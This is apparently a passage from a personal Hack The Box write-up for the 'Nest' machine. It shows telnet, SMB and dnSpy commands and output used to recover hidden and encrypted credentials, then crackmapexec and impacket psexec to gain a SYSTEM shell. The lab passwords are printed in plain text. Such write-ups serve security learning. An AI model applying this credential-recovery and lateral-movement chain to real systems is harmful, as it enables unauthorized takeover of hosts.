<ServiceSettings xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <Port>4386</Port>
  <QueryDirectory>C:\Program Files\HQK\ALL QUERIES</QueryDirectory>
</ServiceSettings>noob2uub@kali:~/ctf/htb/nest/HQK Reporting$ 
```
running NC on the port doesn't get us much.

```console
noob2uub@kali:~/ctf/htb/nest/HQK Reporting$ nc 10.10.10.178 4386

HQK Reporting Service V1.2

>dir
```
NC doesnt get us anything so lets just try a few things like SSH, FTP, and Telnet

TELNET works

### Telnet

```console
noob2uub@kali:~/ctf/htb/nest/HQK Reporting$ telnet 10.10.10.178 4386
Trying 10.10.10.178...
Connected to 10.10.10.178.
Escape character is '^]'.

HQK Reporting Service V1.2

>ls

Unrecognised command
>dir

Unrecognised command
>help

This service allows users to run queries against databases using the legacy HQK format

--- AVAILABLE COMMANDS ---

LIST
SETDIR <Directory_Name>
RUNQUERY <Query_ID>
DEBUG <Password>
HELP <Command>
>
```
Nothing in Telnet this was a major rabit hole

lets go back to the smbclient

### SMB Client

```console
noob2uub@kali:~/ctf/htb/nest$ smbclient -U c.smith //10.10.10.178/Users xRxRxPANCAK3SxRxRx
Try "help" to get a list of possible commands.
smb: \> cd C.Smith
smb: \C.Smith\> ls
  .                                   D        0  Sat Jan 25 23:21:44 2020
  ..                                  D        0  Sat Jan 25 23:21:44 2020
  HQK Reporting                       D        0  Thu Aug  8 16:06:17 2019
  user.txt                            A       34  Mon May  2 13:37:20 2022

		5242623 blocks of size 4096. 1840207 blocks available
smb: \C.Smith\> cd HQK Reporting\
cd \C.Smith\HQK\: NT_STATUS_OBJECT_NAME_NOT_FOUND
smb: \C.Smith\> cd HQK Reporting\
cd \C.Smith\HQK\: NT_STATUS_OBJECT_NAME_NOT_FOUND
smb: \C.Smith\> cd HQK Reporting
cd \C.Smith\HQK\: NT_STATUS_OBJECT_NAME_NOT_FOUND
smb: \C.Smith\> cd "HQK Reporting"
smb: \C.Smith\HQK Reporting\> list
0:	server=10.10.10.178, share=Users
smb: \C.Smith\HQK Reporting\> dir
  .                                   D        0  Thu Aug  8 16:06:17 2019
  ..                                  D        0  Thu Aug  8 16:06:17 2019
  AD Integration Module               D        0  Fri Aug  9 05:18:42 2019
  Debug Mode Password.txt             A        0  Thu Aug  8 16:08:17 2019
  HQK_Config_Backup.xml               A      249  Thu Aug  8 16:09:05 2019

		5242623 blocks of size 4096. 1840207 blocks available
smb: \C.Smith\HQK Reporting\> allinfo
allinfo <file>
smb: \C.Smith\HQK Reporting\> allinfo Debug Mode Password.txt 
NT_STATUS_OBJECT_NAME_NOT_FOUND getting alt name for \C.Smith\HQK Reporting\Debug
smb: \C.Smith\HQK Reporting\> allinfo "Debug Mode Password.txt" 
altname: DEBUGM~1.TXT
create_time:    Thu Aug  8 04:06:12 PM 2019 PDT
access_time:    Thu Aug  8 04:06:12 PM 2019 PDT
write_time:     Thu Aug  8 04:08:17 PM 2019 PDT
change_time:    Wed Jul 21 11:47:12 AM 2021 PDT
attributes: A (20)
stream: [::$DATA], 0 bytes
stream: [:Password:$DATA], 15 bytes
smb: \C.Smith\HQK Reporting\> get "Debug Mode Password.txt":Password 
getting file \C.Smith\HQK Reporting\Debug Mode Password.txt:Password of size 15 as Debug Mode Password.txt:Password (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \C.Smith\HQK Reporting\> 
```

I did have to get a hint on this one, I was stuck for a while and found the allinfo command, which let me down the line of finding :Passwords. having a password.txt file with 0 bytes was a tip off.

But whose password is this.... 

There was that DEBUG tool in telnet, lets take a look. 

### Telnet

```console
noob2uub@kali:~/ctf/htb/nest$ telnet 10.10.10.178 4386
Trying 10.10.10.178...
Connected to 10.10.10.178.
Escape character is '^]'.

HQK Reporting Service V1.2

>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[DIR]  COMPARISONS
[1]   Invoices (Ordered By Customer)
[2]   Products Sold (Ordered By Customer)
[3]   Products Sold In Last 30 Days

Current Directory: ALL QUERIES
>help

This service allows users to run queries against databases using the legacy HQK format

--- AVAILABLE COMMANDS ---

LIST
SETDIR <Directory_Name>
RUNQUERY <Query_ID>
DEBUG <Password>
HELP <Command>
>DEBUG WBQ201953D8w

Debug mode enabled. Use the HELP command to view additional commands that are now available
>help

This service allows users to run queries against databases using the legacy HQK format

--- AVAILABLE COMMANDS ---

LIST
SETDIR <Directory_Name>
RUNQUERY <Query_ID>
DEBUG <Password>
HELP <Command>
SERVICE
SESSION
SHOWQUERY <Query_ID>
``` 
We have a few more commands Service and Session

### Service

```console
--- HQK REPORTING SERVER INFO ---

Version: 1.2.0.0
Server Hostname: HTB-NEST
Server Process: "C:\Program Files\HQK\HqkSvc.exe"
Server Running As: Service_HQK
Initial Query Directory: C:\Program Files\HQK\ALL QUERIES
```
### Session

```console
>session

--- Session Information ---

Session ID: fcb3c67b-1bae-431c-8136-6bbc7ca79366
Debug: True
Started At: 5/2/2022 9:56:39 PM
Server Endpoint: 10.10.10.178:4386
Client Endpoint: 10.10.14.14:56312
Current Query Directory: C:\Program Files\HQK\ALL QUERIES
```

### List Query 

```console
noob2uub@kali:~/ctf/htb/nest$ telnet 10.10.10.178 4386
Trying 10.10.10.178...
Connected to 10.10.10.178.
Escape character is '^]'.

HQK Reporting Service V1.2

>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[DIR]  COMPARISONS
[1]   Invoices (Ordered By Customer)
[2]   Products Sold (Ordered By Customer)
[3]   Products Sold In Last 30 Days

Current Directory: ALL QUERIES
``` 
lets start looking at these 

```console
--- AVAILABLE COMMANDS ---

LIST
SETDIR <Directory_Name>
RUNQUERY <Query_ID>
DEBUG <Password>
HELP <Command>
SERVICE
SESSION
SHOWQUERY <Query_ID>

>runquery 1

Invalid database configuration found. Please contact your system administrator
>showquery 1

TITLE=Invoices (Ordered By Customer)
QUERY_MODE=VIEW
QUERY_TYPE=INVOICE
SORTBY=CUSTOMER
DATERANGE=ALL

>showquery 2

TITLE=Products Sold (Ordered By Customer)
QUERY_MODE=VIEW
QUERY_TYPE=PRODUCT
SORTBY=CUSTOMER
DATERANGE=ALL

>showquery 3

TITLE=Products Sold In Last 30 Days
QUERY_MODE=VIEW
QUERY_TYPE=PRODUCT
DATERANGE=LAST30

```
I don't see anything that really helps me so lets go through the directories. 

```console
>setdir ..

Current directory set to HQK
>ls

Unrecognised command
>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[DIR]  ALL QUERIES
[DIR]  LDAP
[DIR]  Logs
[1]   HqkSvc.exe
[2]   HqkSvc.InstallState
[3]   HQK_Config.xml

Current Directory: HQK
>showquery 1

File over size limit. Are you sure this is a HQK query file?
>showquery 2

<?xml version="1.0" encoding="utf-8"?><ArrayOfKeyValueOfanyTypeanyType xmlns:i="http://www.w3.org/2001/XMLSchema-instance" xmlns:x="http://www.w3.org/2001/XMLSchema" z:Id="1" z:Type="System.Collections.Hashtable" z:Assembly="0" xmlns:z="http://schemas.microsoft.com/2003/10/Serialization/" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays"><LoadFactor z:Id="2" z:Type="System.Single" z:Assembly="0" xmlns="">0.72</LoadFactor><Version z:Id="3" z:Type="System.Int32" z:Assembly="0" xmlns="">2</Version><Comparer i:nil="true" xmlns="" /><HashCodeProvider i:nil="true" xmlns="" /><HashSize z:Id="4" z:Type="System.Int32" z:Assembly="0" xmlns="">3</HashSize><Keys z:Id="5" z:Type="System.Object[]" z:Assembly="0" z:Size="2" xmlns=""><anyType z:Id="6" z:Type="System.String" z:Assembly="0" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays">_reserved_nestedSavedStates</anyType><anyType z:Id="7" z:Type="System.String" z:Assembly="0" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays">_reserved_lastInstallerAttempted</anyType></Keys><Values z:Id="8" z:Type="System.Object[]" z:Assembly="0" z:Size="2" xmlns=""><anyType z:Id="9" z:Type="System.Collections.IDictionary[]" z:Assembly="0" z:Size="1" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays"><ArrayOfKeyValueOfanyTypeanyType z:Id="10" z:Type="System.Collections.Hashtable" z:Assembly="0"><LoadFactor z:Id="11" z:Type="System.Single" z:Assembly="0" xmlns="">0.72</LoadFactor><Version z:Id="12" z:Type="System.Int32" z:Assembly="0" xmlns="">2</Version><Comparer i:nil="true" xmlns="" /><HashCodeProvider i:nil="true" xmlns="" /><HashSize z:Id="13" z:Type="System.Int32" z:Assembly="0" xmlns="">3</HashSize><Keys z:Id="14" z:Type="System.Object[]" z:Assembly="0" z:Size="2" xmlns=""><anyType z:Ref="6" i:nil="true" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays" /><anyType z:Ref="7" i:nil="true" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays" /></Keys><Values z:Id="15" z:Type="System.Object[]" z:Assembly="0" z:Size="2" xmlns=""><anyType z:Id="16" z:Type="System.Collections.IDictionary[]" z:Assembly="0" z:Size="2" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays"><ArrayOfKeyValueOfanyTypeanyType z:Id="17" z:Type="System.Collections.Hashtable" z:Assembly="0"><LoadFactor z:Id="18" z:Type="System.Single" z:Assembly="0" xmlns="">0.72</LoadFactor><Version z:Id="19" z:Type="System.Int32" z:Assembly="0" xmlns="">6</Version><Comparer i:nil="true" xmlns="" /><HashCodeProvider i:nil="true" xmlns="" /><HashSize z:Id="20" z:Type="System.Int32" z:Assembly="0" xmlns="">7</HashSize><Keys z:Id="21" z:Type="System.Object[]" z:Assembly="0" z:Size="5" xmlns=""><anyType z:Ref="7" i:nil="true" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays" /><anyType z:Ref="6" i:nil="true" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays" /><anyType z:Id="22" z:Type="System.String" z:Assembly="0" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays">hadServiceLogonRight</anyType><anyType z:Id="23" z:Type="System.String" z:Assembly="0" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays">Account</anyType><anyType z:Id="24" z:Type="System.String" z:Assembly="0" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays">Username</anyType></Keys><Values z:Id="25" z:Type="System.Object[]" z:Assembly="0" z:Size="5" xmlns=""><anyType z:Id="26" z:Type="System.Int32" z:Assembly="0" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays">-1</anyType><anyType z:Id="27" z:Type="System.Collections.IDictionary[]" z:Assembly="0" z:Size="0" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays" /><anyType z:Id="28" z:Type="System.Boolean" z:Assembly="0" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays">true</anyType><anyType z:Id="29" z:Type="System.ServiceProcess.ServiceAccount" z:Assembly="System.ServiceProcess, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays">User</anyType><anyType z:Id="30" z:Type="System.String" z:Assembly="0" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays">.\service_hqk</anyType></Values></ArrayOfKeyValueOfanyTypeanyType><ArrayOfKeyValueOfanyTypeanyType z:Id="31" z:Type="System.Collections.Hashtable" z:Assembly="0"><LoadFactor z:Id="32" z:Type="System.Single" z:Assembly="0" xmlns="">0.72</LoadFactor><Version z:Id="33" z:Type="System.Int32" z:Assembly="0" xmlns="">4</Version><Comparer i:nil="true" xmlns="" /><HashCodeProvider i:nil="true" xmlns="" /><HashSize z:Id="34" z:Type="System.Int32" z:Assembly="0" xmlns="">7</HashSize><Keys z:Id="35" z:Type="System.Object[]" z:Assembly="0" z:Size="3" xmlns=""><anyType z:Id="36" z:Type="System.String" z:Assembly="0" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays">installed</anyType><anyType z:Ref="7" i:nil="true" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays" /><anyType z:Ref="6" i:nil="true" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays" /></Keys><Values z:Id="37" z:Type="System.Object[]" z:Assembly="0" z:Size="3" xmlns=""><anyType z:Id="38" z:Type="System.Boolean" z:Assembly="0" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays">true</anyType><anyType z:Id="39" z:Type="System.Int32" z:Assembly="0" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays">0</anyType><anyType z:Id="40" z:Type="System.Collections.IDictionary[]" z:Assembly="0" z:Size="1" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays"><ArrayOfKeyValueOfanyTypeanyType z:Id="41" z:Type="System.Collections.Hashtable" z:Assembly="0"><LoadFactor z:Id="42" z:Type="System.Single" z:Assembly="0" xmlns="">0.72</LoadFactor><Version z:Id="43" z:Type="System.Int32" z:Assembly="0" xmlns="">6</Version><Comparer i:nil="true" xmlns="" /><HashCodeProvider i:nil="true" xmlns="" /><HashSize z:Id="44" z:Type="System.Int32" z:Assembly="0" xmlns="">7</HashSize><Keys z:Id="45" z:Type="System.Object[]" z:Assembly="0" z:Size="5" xmlns=""><anyType z:Ref="7" i:nil="true" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays" /><anyType z:Id="46" z:Type="System.String" z:Assembly="0" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays">alreadyRegistered</anyType><anyType z:Id="47" z:Type="System.String" z:Assembly="0" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays">baseInstalledAndPlatformOK</anyType><anyType z:Ref="6" i:nil="true" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays" /><anyType z:Id="48" z:Type="System.String" z:Assembly="0" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays">logExists</anyType></Keys><Values z:Id="49" z:Type="System.Object[]" z:Assembly="0" z:Size="5" xmlns=""><anyType z:Id="50" z:Type="System.Int32" z:Assembly="0" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays">-1</anyType><anyType z:Id="51" z:Type="System.Boolean" z:Assembly="0" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays">false</anyType><anyType z:Id="52" z:Type="System.Boolean" z:Assembly="0" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays">true</anyType><anyType z:Id="53" z:Type="System.Collections.IDictionary[]" z:Assembly="0" z:Size="0" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays" /><anyType z:Id="54" z:Type="System.Boolean" z:Assembly="0" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays">true</anyType></Values></ArrayOfKeyValueOfanyTypeanyType></anyType></Values></ArrayOfKeyValueOfanyTypeanyType></anyType><anyType z:Id="55" z:Type="System.Int32" z:Assembly="0" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays">1</anyType></Values></ArrayOfKeyValueOfanyTypeanyType></anyType><anyType z:Id="56" z:Type="System.Int32" z:Assembly="0" xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays">0</anyType></Values></ArrayOfKeyValueOfanyTypeanyType>

>showquery 3

<?xml version="1.0"?>
<ServiceSettings xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <Port>4386</Port>
  <DebugPassword>WBQ201953D8w</DebugPassword>
  <QueryDirectory>C:\Program Files\HQK\ALL QUERIES</QueryDirectory>
</ServiceSettings>

>
```
Nothing good here, there was a logs folder that had a txt file that I couldnt query, so I decided to look at the LDAP folder.

```console
Current directory set to LDAP
>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[1]   HqkLdap.exe
[2]   Ldap.conf

Current Directory: LDAP
>showquery 2

Domain=nest.local
Port=389
BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
User=Administrator
Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=
```

We have a password now.

yup again this is encrpyted ??!*??K??..??@??..??^...A??j..??)??.??H??U?? 

Lets run it against the VS Code.

I could not run the VS Code as as I did prior. I had to edit the new source code and for that I had to reseach and get more hints, since coding is something that I am working on. 

### dnSpy

![image](https://user-images.githubusercontent.com/68706090/166335134-52381bc1-1df3-4f46-b010-89921f7f1757.png)

```console
public static void Main()
		{
			checked
			{
				try
				{
					if (MyProject.Application.CommandLineArgs.Count != 1)
					{
						Console.WriteLine("Invalid number of command line arguments");
					}
					else if (!File.Exists(MyProject.Application.CommandLineArgs[0]))
					{
						Console.WriteLine("Specified config file does not exist");
					}
					else if (!File.Exists("HqkDbImport.exe"))
					{
						Console.WriteLine("Please ensure the optional database import module is installed");
					}
					else
					{
						LdapSearchSettings ldapSearchSettings = new LdapSearchSettings();
						foreach (string text in File.ReadAllLines(MyProject.Application.CommandLineArgs[0]))
						{
							if (text.StartsWith("Domain=", StringComparison.CurrentCultureIgnoreCase))
							{
								ldapSearchSettings.Domain = text.Substring(text.IndexOf('=') + 1);
							}
							else if (text.StartsWith("User=", StringComparison.CurrentCultureIgnoreCase))
							{
								ldapSearchSettings.Username = text.Substring(text.IndexOf('=') + 1);
							}
							else if (text.StartsWith("Password=", StringComparison.CurrentCultureIgnoreCase))
							{
								ldapSearchSettings.Password = CR.DS(text.Substring(text.IndexOf('=') + 1));
							}
						}
						Ldap ldap = new Ldap();
						ldap.Username = ldapSearchSettings.Username;
						ldap.Password = ldapSearchSettings.Password;
						ldap.Domain = ldapSearchSettings.Domain;
						Console.WriteLine("The Password is: ");
						Console.WriteLine(ldap.Password);
						List<string> list = ldap.FindUsers();
						Console.WriteLine(Conversions.ToString(list.Count) + " user accounts found. Importing to database...");
```

I used the tool dnSpy to load the binary and was able to edit the code. Looking into the code there are a few things that are required the HqkDbImport.exe, ldap.conf file that feeds the username and password to the software, and editing the code. 

``console
Console.WriteLine("The Password is: ");
Console.WriteLine(ldap.Password);
```

This was to ensure that I was using the right version of the code so it will say the Password is and not lday query. Then executing the code in CMD got me.

```console
C:\Users\jayso\Desktop\CTF\HTB\NEST>HqkLdap.exe ldap.conf
Performing LDAP query...
Unexpected error: The specified domain does not exist or cannot be contacted.

C:\Users\jayso\Desktop\CTF\HTB\NEST>HqkLdap.exe ldap.conf
The Password is:
XtH4nkS4Pl4y1nGX
Unexpected error: The specified domain does not exist or cannot be contacted.
```
Now let run crackmapexec

### Crackmapexec

```console
noob2uub@kali:~/ctf/htb/nest$ crackmapexec smb 10.10.10.178 -u administrator -p XtH4nkS4Pl4y1nGX
/usr/lib/python3/dist-packages/pywerview/requester.py:144: SyntaxWarning: "is not" with a literal. Did you mean "!="?
  if result['type'] is not 'searchResEntry':
SMB         10.10.10.178    445    HTB-NEST         [*] Windows 6.1 Build 7601 (name:HTB-NEST) (domain:HTB-NEST) (signing:False) (SMBv1:False)
SMB         10.10.10.178    445    HTB-NEST         [+] HTB-NEST\administrator:XtH4nkS4Pl4y1nGX (Pwn3d!)
```
We have a pwned now lets run psexec for the shell

### PSEXEC

```console
noob2uub@kali:~/ctf/htb/nest$ psexec.py administrator@10.10.10.178
Impacket v0.9.25.dev1+20220501.210324.0e40593a - Copyright 2021 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.178.....
[*] Found writable share ADMIN$
[*] Uploading file aVqWuYEi.exe
[*] Opening SVCManager on 10.10.10.178.....
[*] Creating service QMWP on 10.10.10.178.....
[*] Starting service QMWP.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> 
```

now lets get the last flag.

```console
C:\Users\Administrator> dir
 Volume in drive C has no label.
 Volume Serial Number is E6FB-F2E9

 Directory of C:\Users\Administrator

08/05/2019  09:33 PM    <DIR>          .
08/05/2019  09:33 PM    <DIR>          ..
01/25/2020  11:02 PM    <DIR>          Contacts
07/21/2021  07:27 PM    <DIR>          Desktop
01/25/2020  11:02 PM    <DIR>          Documents
01/25/2020  11:02 PM    <DIR>          Downloads
01/25/2020  11:02 PM    <DIR>          Favorites
01/25/2020  11:02 PM    <DIR>          Links
01/25/2020  11:02 PM    <DIR>          Music
01/25/2020  11:02 PM    <DIR>          Pictures
01/25/2020  11:02 PM    <DIR>          Saved Games
01/25/2020  11:02 PM    <DIR>          Searches
01/25/2020  11:02 PM    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)   7,536,791,552 bytes free

C:\Users\Administrator> cd Desktop

C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is E6FB-F2E9

 Directory of C:\Users\Administrator\Desktop

07/21/2021  07:27 PM    <DIR>          .
07/21/2021  07:27 PM    <DIR>          ..
05/02/2022  09:37 PM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   7,536,791,552 bytes free

C:\Users\Administrator\Desktop> cat root.txt
'cat' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\Administrator\Desktop> type root.txt
```
